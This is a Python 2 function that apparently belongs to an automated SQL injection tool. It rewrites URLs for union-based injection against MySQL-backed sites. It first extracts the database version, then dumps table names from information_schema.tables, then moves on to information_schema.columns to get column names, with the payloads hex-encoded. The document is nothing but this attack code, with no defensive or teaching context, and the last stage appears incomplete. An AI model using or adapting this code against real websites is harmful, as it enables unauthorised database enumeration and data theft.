def repl(site, stage, other):
    if stage==1:
        if other=='1':
            site=site.replace("SELECT+%s" %other,"SELECT+@@version")
        else:
            site=site.replace(",%s"%other,",@@version")
    if stage==2:
        site=site.replace("@@version","unhex(hex(group_concat(0x3c,0x74,0x61,0x62,0x6c,0x65,0x20,0x73,0x74,0x79,0x6c,0x65,0x3d,0x22,0x77,0x69,0x64,0x74,0x68,0x3a,0x32,0x39,0x25,0x22,0x3e,table_name,0x3c,0x2f,0x74,0x61,0x62,0x6c,0x65,0x3e,0x0a)))")
        other=other.encode("hex")
        site=site.replace("--","+FROM+information_schema.tables+WHERE+table_schema=0x%s--") %other
    if stage==3:
        site=site.replace("table_name","column_name")
        other=other.encode("hex")
        site=site.replace("+FROM+information_schema.tables+WHERE+table_schema=0x%s--"%other,"+FROM+information_schema.columns+WHERE+table_name=0x")
            

    return(site)
